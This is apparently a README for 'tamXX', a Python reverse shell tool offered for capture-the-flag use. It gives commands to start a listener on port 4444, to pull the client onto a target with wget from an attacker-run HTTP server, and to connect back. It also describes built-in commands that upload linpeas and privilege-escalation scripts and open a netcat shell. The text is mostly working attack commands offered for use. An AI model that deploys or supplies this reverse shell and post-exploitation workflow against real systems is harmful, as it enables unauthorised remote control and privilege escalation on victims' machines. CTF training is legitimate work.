# tamcat
What is tamXX ?
tamXX is a python reverse shell helping you in ctf
# REVERSE SHELL PYTHON
*by arvialo*

**SETUP tamXX**
```bash
cd /opt
git clone https://github.com/Arvialo/tamXX
cd tamXX
pip3 install -r requirements.txt
```

# USE tamXX
**ON LOCAL MACHINE**
```bash
chmod +x tamServ.py
./tamServ --help # get help
./tamServ -l -p 4444
./tamServ --listen --port 4444
```

**ON REMOTE MACHINE**
```bash
#first, put tamCli.py on remote machine by http server for example
# on local machine : python3 -m http.server
# on remote machine : wget http://<IP>:8000/tamCli.py
chmod +x tamCli.py
./tamCli.py --help
./tamCl.py --target localhost --prompt --port 4444
```

**Once connected to machine (from server)**
```bash
# when you are on remote machine, there is written (remote) at the beginning
(remote) root@[/opt/tamXX] $
# and when you are on local machine, there is written (local) at the beginning
(local) arvial@[/opt/tamXX] $

#to switch between two machines, you have to put "local" on tamServ's command prompt
ex:
(remote) root@[/opt/tamXX] $ local
(local) arvial@[/opt/tamXX] $

# next to (local) or (remote) you have username and next to username you have path location
# Then, only from (local) :
(local) arvial@[/opt/tamXX] $ help
            WE ARE ON ! WHAT CAN I DO ?
            [OPTIONS] :
                First, you can execute almost same commands like real shell!
                help		get some help ;)
                linpeas		upload linpeas.sh on machine
                shell		get full interactive shell
                upload		upload file into machine
                    (ex : upload <fileSource> <fileDestination>
                          files available : suid.py)
#So you can type 'linpeas' and it will upload linpeas on remote
# you can type 'shell' and it will open new command prompt with netcat shell
# And you can type 'upload' to upload file located in /opt/tamXX/privesc/ ----> you can add you file inside
(remote) root@[/opt/tamXX] $ cd /dev/shm
(remote) root@[/opt/tamXX] $ local
(local) arvial@[/opt/tamXX] $ upload suid.py suid.py
UPLOADED !
(local) root@[/opt/tamXX] $ exit
(remote) root@[/dev/shm] $ ls
suid.py

#and it is uploaded !

```

Be careful, it is not an full interactive shell, so some commands like while's loop will not work and it can break the shell.
